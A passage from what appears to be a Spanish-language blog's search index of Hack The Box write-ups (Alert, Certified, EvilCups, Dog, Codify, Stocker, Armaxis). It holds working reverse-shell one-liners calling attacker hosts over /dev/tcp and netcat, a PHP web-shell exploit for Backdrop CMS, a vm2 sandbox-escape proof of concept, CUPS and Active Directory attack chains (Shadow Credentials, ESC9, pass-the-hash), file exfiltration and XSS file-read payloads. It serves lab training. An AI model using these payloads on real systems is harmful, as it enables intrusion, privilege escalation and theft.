la ruta absoluta del archivo, podemos inferir que existe otro servicio web local (ya que no fue reportado en nuestro escaneo con nmap). Vemos los puertos internos en escucha con netstat -tuln:\nSi usamos ps aux, podremos observar que el servicio est√° corriendo como root, por lo que procedemos a hacer port forwarding (aseg√∫rate de que tu puerto {port} no est√© en uso).\nssh -L {port}:localhost:8080 albert@IP Despu√©s de revisar /opt/website-monitor/config/configuration.php m√°s a detalle, resulta que nuestro usuario tiene permisos completos sobre toda la carpeta /config. A juzgar por lo simple de la aplicaci√≥n, deber√≠amos poder acceder a cualquier archivo dentro del directorio /website-monitor. Con nuestros permisos de escritura en la carpeta /config, podemos crear un archivo con una revshell PHP alojado en dicha carpeta para obtener una shell como root.\n\u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;/dev/tcp/{IP}/{PORT} 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; Para activar el archivo .php, solo es necesario ingresar su ruta en el navegador:\nhttp://localhost:{port}/config/payload.php.\n","date":"24 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/alert/","section":"Hack The Box","summary":"","title":"Alert","type":"maquinas"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/apache-server/","section":"Tags","summary":"","title":"Apache-Server","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/cross-site-scripting/","section":"Tags","summary":"","title":"Cross-Site-Scripting","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/markdown-injection/","section":"Tags","summary":"","title":"Markdown-Injection","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/port-fowarding/","section":"Tags","summary":"","title":"Port-Fowarding","type":"tags"},{"content":"","date":"24 marzo 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"\rDescripci√≥n: #\rMaquina en la cual con las credenciales que nos proporcionan hacemos uso de bloodhund para poder cambiar de usuario usando la tecnica Shadow Credentials, para luego mediate de una herramienta encontrar la vulnerabilidad ESC9 y poder elevar privilegios.\nEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.41 -oG allPorts nmap -sCV -p53,88,135,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49681,49714,49719,49770 10.10.11.41 -oN target Vamos a usar las credenciales que nos provee hack the box judith.mader / judith09, vamos a listar tanto servicios compartidos como usuarios con los dos siguientes comandos.\nxc smb 10.10.11.41 -d certified.htb -u judith.mader -p judith09 --shares nxc smb 10.10.11.41 -u judith.mader -p \u0026#39;judith09\u0026#39; --users Vamos a listar las configuraciones y los protocolos que se le aplican a la maquina con el comando:\nnxc smb 10.10.11.41 -u judith.mader -p \u0026#39;judith09\u0026#39; --pass-pol La enumeraci√≥n de la pol√≠tica de contrase√±as muestra que la longitud m√≠nima de la contrase√±a es de 7 caracteres, la complejidad de la contrase√±a est√° desactivada (esto significa que los usuarios pueden elegir contrase√±as cortas y d√©biles) y, lo m√°s importante, la opci√≥n Account Lockout Threshold, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada.\nYa con esto queremos saber que grupos y usuarios hay creados por lo que vamos a usar ldapdomaindump para que nos muestre esto.\nldapdomaindump -u \u0026#39;certified.htb\\judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; 10.10.11.41 Bloodhund #\rVamos a usar una herramienta llamada bloodhund que nos va a ayudar encontrar vulnerabilidades para saltar de un usuario a otro y hacer finalmente el escalamiento de privilegios. Para instalarlo y configurarlo seguir este paso a paso https://www.kali.org/tools/bloodhound/.\nbloodhound-python -u \u0026#39;judith.mader\u0026#39; -p \u0026#39;judith09\u0026#39; -ns 10.10.11.41 -d certified.htb -c all Despues de subir los archivos que nos genero el comando y buscar al usuario al cual tenemos acceso podemos ver que en Outbound Object Control tenemos la opci√≥n de saltar a otro usuario en este caso ‚Äúmanagement_scv**@certified.htb‚Äù.**\nAhora lo que vamos a hacer es seguir lo que nos dice bloodhund, descargamos los siguientes scripts:\nhttps://github.com/fortra/impacket/blob/master/examples/dacledit.py https://github.com/fortra/impacket/blob/master/examples/owneredit.py https://github.com/ShutdownRepo/pywhisker/blob/main/pywhisker/pywhisker.py python3 owneredit.py -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09 python3 dacledit.py -action \u0026#39;write\u0026#39; -rights \u0026#39;WriteMembers\u0026#39; -principal judith.mader -target Management certified.htb/judith.mader:judith09 net rpc group addmem management management -U certified.htb/judith.mader%judith09 -S certified.htb pth-net rpc group addmem management judith.mader -U certified.htb/judith.mader%37937096CA6E6E2209752A3293831D17:8EC62AC86259004C121A7DF4243A7A80 -S certified.htb Despues de esto lo que hemos hecho es agregar a judith al grupo management y ahora podemos modificar ls atributos de management_svc para verificar que todo se ha hecho ejecutamos el comando a continuacion.\nnet rpc group members management -U certified.htb/judith.mader%judith09 -S certified.htb Ahora para aplicar el ataque de shadow credentials vamos a usar una herramienta llamada certipy la cual vamos a instalar en un entorno virtual de python.\npython3 -m venv env source env/bin/activate pip3 install certipy-ad Si bien podriamos mandar el comando de certipy solamente es my probable que tengamos un error debido a que nuestra hora es diferente al de la maquina por lo que tambien vamos a usar faketime de la siguiente manera:\nfaketime \u0026#34;$(ntpdate -q certified.htb | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; certipy shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc Ahora desde bloodhund podemos ver que podemos cambiar hacia el usuario ca_operator con un GenericAll por lo que vamos a seguir lo que nos dice.\npth-net rpc password ca_operator \u0026#34;nueva contrase√±a\u0026#34; -U certified.htb/management_svc%ffffffffffffffffffffffffffffffff:a091c1832bcdd4677c28b5a6a1295584 -S certified.htb Con esto le hemos cambiado la contrase√±a a el usuario ca_operator ahora vamos a tratar de encontrar alguna otra vulnerabilidad usando certipy de nuevo.\ncertipy find -dc-ip 10.10.11.41 -u ca_operator -p \u0026#34;nueva contrase√±a\u0026#34; Abriendo el txt que nos deja este comando en la parte de certipy templates podemos ver una vulnerabilidad ESC9\nVamo a irnos a esta pagina para que nos de el hash de la contrase√±a que le asignamos https://www.browserling.com/tools/ntlm-hash y luego vamos a ejecutar los siguientes comandos para explotar el ESC9\ncertipy account update -username management_svc@certified.htb -hashes \u0026#34;hash management_svc\u0026#34; -user ca_operator -upn administrator certipy req -username ca_operator@certified.htb -hashes \u0026#34;hash nueva contrase√±a\u0026#34; -ca certified-DC01-CA -template CertifiedAuthentication -debug \u0002\nRevertimos lo que hemos hecho con el usuario ca_operator para que cuando busqeumos el hash de administrator lo halle:\ncertipy account update -username management_svc@certified.htb -hashes \u0026#34;hash management_svc\u0026#34; -user ca_operator -upn ca_operator@certified.htb Y finalmente buscamos el hash del administrator con el siguiente comando teniendo en cuenta los problemas de hora que puede tener la maquina.\ncertipy auth -pfx administrator.pfx -domain certified.htb Finalmente con el hash del administrator vamos a conseguir una shell y ya podremos encontrar las dos flags:\nevil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34 ","date":"16 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/certified/","section":"Hack The Box","summary":"","title":"Certified","type":"maquinas"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/esc9/","section":"Tags","summary":"","title":"ESC9","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/impacket/","section":"Tags","summary":"","title":"Impacket","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/netexec/","section":"Tags","summary":"","title":"Netexec","type":"tags"},{"content":"","date":"16 marzo 2025","externalUrl":null,"permalink":"/tags/shadow-credentials/","section":"Tags","summary":"","title":"Shadow-Credentials","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47076/","section":"Tags","summary":"","title":"CVE-2024-47076","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47175/","section":"Tags","summary":"","title":"CVE-2024-47175","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47176/","section":"Tags","summary":"","title":"CVE-2024-47176","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/cve-2024-47177/","section":"Tags","summary":"","title":"CVE-2024-47177","type":"tags"},{"content":"\rDescripci√≥n: #\rMaquina que nos pide explotar un CVE de el servicio CUPS donde podemos obtener una shell, el escalamiento es simplemente leer la documentaci√≥n del servicio y leer un archivo descubriendo su nombre\nEnumeraci√≥n #\rsudo nmap -p- --min-rate 5000 -Pn -n --open -sS [IP] -oG allPorts nmap -p22,601 -sVC -A [IP] -oN target Si hacemos una r√°pida b√∫squeda de puerto 631 encontraremos que adem√°s de mencionar el puerto TCP tambi√©n mencionan el puerto pero en UDP, debido a esto vamos a escanear tambi√©n este protocolo.\nnmap -sU -p631 [IP] CUPS - TCP 631 #\rCups tiene una GUI para ayudar al uso de su servicio.\nPodemos ver que hay una impresora instalada en el servicio.\nUsuario #\rCUPS CVE‚ÄôS #\rBuscando por la versi√≥n del servicio vamos a hallar diferentes vulnerabilidades que hay para este:\nCVE-2024-47176 - cups-browsed, el servicio que t√≠picamente escucha en todas las interfaces UDP 631, es el que permite agregar una impresora a una m√°quina de forma remota. Esta vulnerabilidad permite que cualquier atacante que pueda alcanzar esta m√°quina active una solicitud \u0026ldquo;Get-Printer-Attributes\u0026rdquo; del Protocolo de Impresi√≥n por Internet (IPP) que se env√≠a a una URL controlada por el atacante. Esto se corrigi√≥ simplemente deshabilitando cups-browsed ya que no es realmente la mejor manera de obtener esta funcionalidad. CVE-2024-47076 - libcupsfilters es responsable de manejar los atributos IPP devueltos de la solicitud. Estos se escriben en un archivo temporal de Descripci√≥n de Impresora Postscript (PPD) sin sanitizaci√≥n, permitiendo que se escriban atributos maliciosos. CVE-2024-47175 - libppd es responsable de leer un archivo PPD temporal y convertirlo en un objeto de impresora en el sistema. Tampoco realiza sanitizaci√≥n durante la lectura, permitiendo la inyecci√≥n de datos controlados por el atacante. CVE-2024-47177 - Esta vulnerabilidad en cups-filters permite cargar una impresora usando el filtro de impresi√≥n foomatic-rip, que es un convertidor universal para transformar datos PostScript o PDF al formato que la impresora puede entender. Ha tenido problemas de inyecci√≥n de comandos durante mucho tiempo y se ha limitado solo a instalaciones y configuraciones manuales. Combinando estas cuatro vulnerabilidades podremos agregar una impresora y ejecutar comandos cuando imprimamos desde esta.\nExplotaci√≥n #\rEl creador de la maquina tiene una script que nos va a ayudar a resolver esta maquina.\nLa funci√≥n¬†__main__¬†nos da una buena idea de que hace el script:\nif __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 4: print(\u0026#34;%s \u0026lt;LOCAL_HOST\u0026gt; \u0026lt;TARGET_HOST\u0026gt; \u0026lt;COMMAND\u0026gt;\u0026#34; % sys.argv[0]) quit() SERVER_HOST = sys.argv[1] SERVER_PORT = 12345 command = sys.argv[3] server = IPPServer((SERVER_HOST, SERVER_PORT), IPPRequestHandler, MaliciousPrinter(command)) threading.Thread( target=run_server, args=(server, ) ).start() TARGET_HOST = sys.argv[2] TARGET_PORT = 631 send_browsed_packet(TARGET_HOST, TARGET_PORT, SERVER_HOST, SERVER_PORT) print(\u0026#34;Please wait this normally takes 30 seconds...\u0026#34;) seconds = 0 while True: print(f\u0026#34;\\r{seconds} elapsed\u0026#34;, end=\u0026#34;\u0026#34;, flush=True) time.sleep(1) seconds += 1 Al leer el script nos damos cuenta que lo que esta haciendo es montar un servidor ipp y mandarle un paquete, vamos a revisar en donde se vuelve malicioso el paquete que env√≠a ya que todos los atributos son normales menos el ultimo donde hace una inyecci√≥n pas√°ndole FoomaticRIPCommandLine.\nclass MaliciousPrinter(behaviour.StatelessPrinter): def __init__(self, command): self.command = command super(MaliciousPrinter, self).__init__() def printer_list_attributes(self): attr = { # rfc2911 section 4.4 ( SectionEnum.printer, b\u0026#39;printer-uri-supported\u0026#39;, TagEnum.uri ): [self.printer_uri], ( ...[snip]... ( SectionEnum.printer, b\u0026#39;printer-more-info\u0026#39;, TagEnum.uri ): [f\u0026#39;\u0026#34;\\n*FoomaticRIPCommandLine: \u0026#34;{self.command}\u0026#34;\\n*cupsFilter2 : \u0026#34;application/pdf application/vnd.cups-postscript 0 foomatic-rip\u0026#39;.encode()], ...[snip]... Agregar la impresora #\rPara esto vamos a ejecutar el script de la siguiente forma:\npython evilcups.py 10.10.14.152 10.129.231.157 \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; Y si vamos a la pagina http que tiene el servicio a la parte de impresoras tendremos una nueva impresora:\nListo ahora es el momento de probar si ejecuta comandos:\n# Nos ponemos en escucha nc -lvnp 4444 En la pagina de la impresora en la secci√≥n de mantenimiento podemos imprimir una pagina de prueba con esto conseguiremos la shell y la flag.\nUna mejor shell para enviar seria nohup bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026quot;\u0026amp;, ya que inicia un proceso en segundo plano, para evitar que la shell se pierda cada 5 minutos aproximadamente cuando al impresora se elimina.\nRoot #\rPrimero hacemos el tratamiento de la tty como acostumbramos:\nAqu√≠ est√° el tratamiento t√≠pico de la TTY:\nscript /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm Listo despu√©s de listar por un rato no encontr√© nada interesante por lo que me devolv√≠ a la web y vi que la impresora que siempre esta presente tenia un trabajo que hab√≠a realizado as√≠ que revisando la documentaci√≥n nos dimos cuenta que estos trabajos se guardan en /var/spool/cups/ y si bien no podemos listar dentro del directorio por medio de la documentaci√≥n sabemos el nombre del archivo que es d[5 n√∫meros]-001 por lo tanto si ejecutamos el siguiente comando veremos el archivo:\ncat d00001-001 Entonces vamos a mandarnos este archivo a nuestra maquina para enviar el archivo vamos a usar /dev/tcp podemos hacer:\n# En nuestra maquina nc -lvnp 4444 \u0026gt; archivo.pdf # En la maquina victima cat d00001-001 \u0026gt; /dev/tcp/TU_IP/4444 De esta forma el archivo se transferir√° a nuestra m√°quina a trav√©s de una conexi√≥n TCP en el puerto 4444.\nY si abrimos este pdf en nuestra maquina tendremos la contrase√±a para root:\nSi quieres aprender mas sobre el CVE que se exploto tienes estas referencias:\nhttps://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ ","date":"11 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/evilcups/","section":"Hack The Box","summary":"","title":"EvilCups","type":"maquinas"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/rce/","section":"Tags","summary":"","title":"RCE","type":"tags"},{"content":"","date":"11 marzo 2025","externalUrl":null,"permalink":"/tags/udp/","section":"Tags","summary":"","title":"UDP","type":"tags"},{"content":"","date":"8 marzo 2025","externalUrl":null,"permalink":"/tags/backdrop/","section":"Tags","summary":"","title":"Backdrop","type":"tags"},{"content":"","date":"8 marzo 2025","externalUrl":null,"permalink":"/tags/bee/","section":"Tags","summary":"","title":"Bee","type":"tags"},{"content":"\rDescripci√≥n #\rMaquina sencilla en la que por medio de un git encontramos credenciales para poder luego hacer uso de un exploit con el cual obtendremos ejecucion de comandos para luego reusar las credenciales con los usuarios que podremos listar, para el root fue explotacion de un binario muy sencillo.\nEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allports sudo nmap -sCV -p22,80 \u0026#34;$ip_target\u0026#34; -A -oN target Encontramos un git por lo que vamos a usar git-dumper y tratar de restaurar el git, pero primero vamos a instalar la herramienta.\npipx install git-dumper git-dumper http://IP/.git git cd git git reset --hard cat settings.php Y ah√≠ tendremos una contrase√±a:\nPara hallar usuarios validos lo vamos a hacer tambien en el git usando grep de la siguiente forma:\ngrep -r -i -l \u0026#39;@dog.htb\u0026#39; . 2\u0026gt;/dev/null Puerto 80 #\rAhora con ese usuario y contrase√±a podemos ingresar, si miramos por la pagina encontraremos la verison en el link http://IP/?q=admin/reports/updates\nY si buscamos encontraremos una vulnerabilidad de esta version Exploit.\nExploit #\rVamos a modificar el script para que en vez de .zip nos lo guarde en el formato aceptado .tar.gz\nimport os import time import tarfile def create_files(): info_content = \u0026#34;\u0026#34;\u0026#34; type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a\u0026lt;a href=\u0026#34;https://imgur.com/4H7qVEl\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;https://i.imgur.com/4H7qVEl.png\u0026#34; title=\u0026#34;source: imgur.com\u0026#34; /\u0026gt;\u0026lt;/a\u0026gt; web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 \u0026#34;\u0026#34;\u0026#34; shell_info_path = \u0026#34;shell/shell.info\u0026#34; os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Crea el directorio with open(shell_info_path, \u0026#34;w\u0026#34;) as file: file.write(info_content) shell_content = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; autofocus id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; shell_php_path = \u0026#34;shell/shell.php\u0026#34; with open(shell_php_path, \u0026#34;w\u0026#34;) as file: file.write(shell_content) return shell_info_path, shell_php_path def create_tar(info_path, php_path): tar_filename = \u0026#34;shell.tar.gz\u0026#34; with tarfile.open(tar_filename, \u0026#39;w:gz\u0026#39;) as tarf: tarf.add(info_path, arcname=\u0026#39;shell/shell.info\u0026#39;) tarf.add(php_path, arcname=\u0026#39;shell/shell.php\u0026#39;) return tar_filename def main(url): print(\u0026#34;Backdrop CMS 1.27.1 - Remote Command Execution Exploit\u0026#34;) time.sleep(3) print(\u0026#34;Evil module generating...\u0026#34;) time.sleep(2) info_path, php_path = create_files() tar_filename = create_tar(info_path, php_path) print(\u0026#34;Evil module generated!\u0026#34;, tar_filename) time.sleep(2) print(\u0026#34;Go to \u0026#34; + url + \u0026#34;/admin/modules/install and upload the \u0026#34; + tar_filename + \u0026#34; for Manual Installation.\u0026#34;) time.sleep(2) print(\u0026#34;Your shell address:\u0026#34;, url + \u0026#34;/modules/shell/shell.php\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: import sys if len(sys.argv) \u0026lt; 2: print(\u0026#34;Usage: python script.py [url]\u0026#34;) else: main(sys.argv[1]) Vamos a usar la siguiente revshell:\n#Nuestra maquina nc -lvnp 4444 #Pagina rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc IP 4444 \u0026gt;/tmp/f Usuario #\rSi listamos usuarios en el home veremos dos usuarios:\nUsando de nuevo la contrase√±a que teniamos con johncusak tendremos acceso a la flag de usuario.\nRoot #\rSi listamos permisos sudoers tendremos el bin bee :\nSi ejecutamos el binario veremos lo que podemos hacer, entre esas opciones hay una muy interesante en la cual podemos ejecutar codigo php:\nCon esta informaci√≥n vamos a tratar de obtener una bash como root:\nsudo bee eval \u0026#34;shell_exec(\u0026#39;/bin/bash\u0026#39;);‚Äù Y listo root facilito e interesante solo tocaba leer.\n","date":"8 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/dog/","section":"Hack The Box","summary":"","title":"Dog","type":"maquinas"},{"content":"","date":"8 marzo 2025","externalUrl":null,"permalink":"/tags/git-dumper/","section":"Tags","summary":"","title":"Git-Dumper","type":"tags"},{"content":"","date":"8 marzo 2025","externalUrl":null,"permalink":"/tags/sudoers/","section":"Tags","summary":"","title":"Sudoers","type":"tags"},{"content":"\rDescripci√≥n: #\rMaquina muy entretenida que nos ense√±a a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contrase√±a de root.\nEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts nmap -sCV -p22,80,3000 -A -oN target IP Si tratamos de usar gobuster no encontraremos ningun subdominio ni subdirectorio interesante por lo que no lo voy a mostrar.\nPuerto 80 #\rPodemos ver como tenemos la posibilidad de ejecutar comandos node.js usando la libreria vm2 ademas de esto no vamos a encontrar nada m√°s intreresante por lo que vamos a buscar vulnerabilidades de la libreria.\nEncontraremos la siguiente poc para la libreria en github que es la que vamos a estar usando POC.\nconst {VM} = require(\u0026#34;vm2\u0026#34;); const vm = new VM(); const code = ` err = {}; const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); } }; const proxiedErr = new Proxy(err, handler); try { throw proxiedErr; } catch ({constructor: c}) { c.constructor(\u0026#39;return process\u0026#39;)().mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch pwned\u0026#39;); } ` console.log(vm.run(code)); User #\rYa con esto vamos a poder ejecutar comandos y asi montar una revshell, nos dirigiremos a la pagina RevShells y en nuestra poc ejecutaremos el siguiente comando:\n#Primero ponte en escucha en tu maquina (el siguiente comando) bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PUERTO 0\u0026gt;\u0026amp;1\u0026#34; Y nos pondremos en escucha con netcat en nuestra maquina local:\nnc -lvnp PUERTO Ya con esto le pediremos a la pagina que ejecute nuestro codigo.\nListo lo primero es hacer el tratamiento de la tty:\nscript /dev/null -c bash Ctrl + Z stty raw -echo; fg reset xterm export TERM=xterm Ya en esta parte con find podemos encontrar una base de datos:\nfind /var/www/ -name *.db 2\u0026gt;/dev/null Y veremos que hay una base de datos, usando file nos daremos cuenta que es una base de datos sqlite:\nCon esto podremos ver la base de datos que dentro tiene un hash:\nY con el siguiente comando de hashcat podremos obtener la contrase√±a para ingresar como joshua:\nhashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt -m 3200 Root #\rEnumerando encontramos este script que tenemos permiso de ejecutar como sudo:\nSi vemos el script esta mal montado por lo que cuando pida la contrase√±a podemos usar el * y nos dira que es correcto esto debido a que si no usamos dobles comillas para esas variables DB_PASS y USER_PASS podemos usar el * de forma que sin importar cual se la contrase√±a nos la dara como correcta esto tambien nos habilita la opcion de obtener la contrase√±a con python. Aqu√≠ un ejemplo de porque esto pasa:\nPara poder interceptar la contrase√±a vamos a usar pspy igual que en las anteriores maquinas que lo hemos usado.\nY ahi tenemos la contrase√±a.\nSi tienen curiosiodad de como se hacia mediante el script de python pueden ver esta parte del directo de s4vitar.\n","date":"7 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/codify/","section":"Hack The Box","summary":"","title":"Codify","type":"maquinas"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/nodejs/","section":"Tags","summary":"","title":"Nodejs","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/pspy/","section":"Tags","summary":"","title":"Pspy","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"7 marzo 2025","externalUrl":null,"permalink":"/tags/vm2/","section":"Tags","summary":"","title":"Vm2","type":"tags"},{"content":"\r¬øQu√© son las M√°quinas en Hack The Box? #\rLas M√°quinas en Hack The Box son entornos virtuales que simulan sistemas reales con vulnerabilidades. El objetivo es explotar estas vulnerabilidades para obtener acceso al sistema y escalar privilegios hasta convertirte en root o administrador. Cada m√°quina tiene un nivel de dificultad (f√°cil, medio, dif√≠cil) y cubre una amplia gama de t√©cnicas, como:\nEscaneo de puertos y enumeraci√≥n de servicios. Explotaci√≥n de vulnerabilidades conocidas. Escalada de privilegios. Uso de herramientas como Nmap, Metasploit, Burp Suite, entre otras. ¬øQu√© son los Challenges en Hack The Box? #\rLos Challenges son desaf√≠os independientes que se centran en habilidades espec√≠ficas, como:\nCriptograf√≠a: Descifrar mensajes o romper algoritmos. Reversing: Analizar y entender el funcionamiento de binarios. Web Exploitation: Explotar vulnerabilidades en aplicaciones web. Forensics: Analizar datos para encontrar informaci√≥n oculta. OSINT: Recopilar informaci√≥n de fuentes abiertas. Estos desaf√≠os son ideales para practicar habilidades espec√≠ficas y aprender nuevas t√©cnicas.\nMis P√°ginas de Challenges y M√°quinas #\r","date":"22 febrero 2025","externalUrl":null,"permalink":"/htb/","section":"Hack The Box","summary":"","title":"Hack The Box","type":"page"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/burpsuit/","section":"Tags","summary":"","title":"Burpsuit","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/inyecci%C3%B3n-nosql/","section":"Tags","summary":"","title":"Inyecci√≥n-NoSQL","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/pdf-dinamico/","section":"Tags","summary":"","title":"PDF-Dinamico","type":"tags"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/tags/server-side/","section":"Tags","summary":"","title":"Server-Side","type":"tags"},{"content":"\rDescripci√≥n: #\rMaquina sencilla que mediante una inyecci√≥n NoSQL podemos saltar un login y luego mediante un generador de PDF‚Äôs dinamicos listar archivos y hallat credenciales, en la escalada explotamos un permiso de sudoers Node\nEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts Esto nos mostrara que hay dos puertos el 22 y el 80.\nwhatweb IP Vemos el dominio que es stocker.htb lo agregamos al /etc/hosts y continuamos con el escaneo de puertos.\nnmap -p22,80 -sVC 10.129.184.222 -A -oN target Vamos a listar subdominios a ver si encontramos algo interesante\n\u0026lt;img src=\\\u0026#34;x\\\u0026#34; onerror=\\\u0026#34;document.write(\u0026#39;\u0026lt;iframe src=file:///etc/passwd width=100% height=100%\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;)\\\u0026#34; /\u0026gt; Solo hay dos usuarios con shell root y angoose, ahora vamos a empezar a listar archivos del subdominio dev.stocker.htb suponiendo que por lo general esta en /var/www/dev/ si listamos el index.js:\nHay lo que podria ser una contrase√±a de lo que parece ser el usuario dev pero si recordamos no hay ningun usuario dev por lo que vamos a probar la contrase√±a con angoose y nos funcionara mediante ssh.\nRoot #\rDespues de conectarnos hacemos el tratamiento de la tty mas basico:\nexport TERM=xterm Listando permisos con sudo -l, y tenemos que hay un binario que podemos ejecutar que es node\nVemos que solo podemos ejecutar los archivos de extension js en la carpeta /usr/local/scripts/ pero podemos tratar de hacer un directory traversal por lo que lo primero que vamos a hacer es entrar a https://www.revshells.com/ y mirar la shell #2 que tienen para node\ncd /tmp nano rev.js (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;sh\u0026#34;, []); var client = new net.Socket(); client.connect(4444, \u0026#34;IP\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application from crashing })(); Ahora lo que vamos a hacer es poner nuestra maquina en escucha y tartar de ejecutar el binario con los permisos sudo.\n#Atacante nc -lvnp 4444 #Victima sudo node /usr/local/scripts/../../../../tmp/rev.js Y con esto terminamos la maquina.\n","date":"22 febrero 2025","externalUrl":null,"permalink":"/htb/maquinas/stocker/","section":"Hack The Box","summary":"","title":"Stocker","type":"maquinas"},{"content":"Tenemos una url con dos puertos por lo que vamos a visitar los dos a ver que contienen.\nVemos como tenemos acceso a una bandeja de un correo y en el otro puerto tenemos la opcion de registrar usuarios ingresar y recuperar la contrase√±a.\nRevisando el codigo fuente nos damos cuenta que la recuperacion de contrase√±a no esta bien pensada y es vulnerable a un IDOR porque si bien pide un token y verifica que el token sea valido no verifica a quien le pertenece el token, con este en conocimiento le podemos cambiar la contrase√±a a cualquier usuario.\nVamos a tratar de hallar algun correo de administrador en el codigo fuente usando grep:\ngrep -r admin Solicitamos el cambio de contrase√±a despues de crear un usuario con el correo que nos dieron:\nY hacemos el cambio de contrase√±a para el usuario administrador:\nAhora con eso podemos iniciar sesion como administradores y veremos que tenemos acceso a un funcion para mostrar ‚Äúweapons‚Äù\nTambien vemos que en la nota acepta markdown por lo que podemos tratar de hacer una inyecci√≥n para obtener la flag.\nimg[!](file:///flag.txt) Si pasamos lo que nos muestra el codigo fuente a un decoder de base64 nos dara la flag.\n","date":"21 febrero 2025","externalUrl":null,"permalink":"/htb/challenges/armaxis/","section":"Hack The Box","summary":"","title":"Armaxis","type":"challenges"},{"content":"","date":"21 febrero 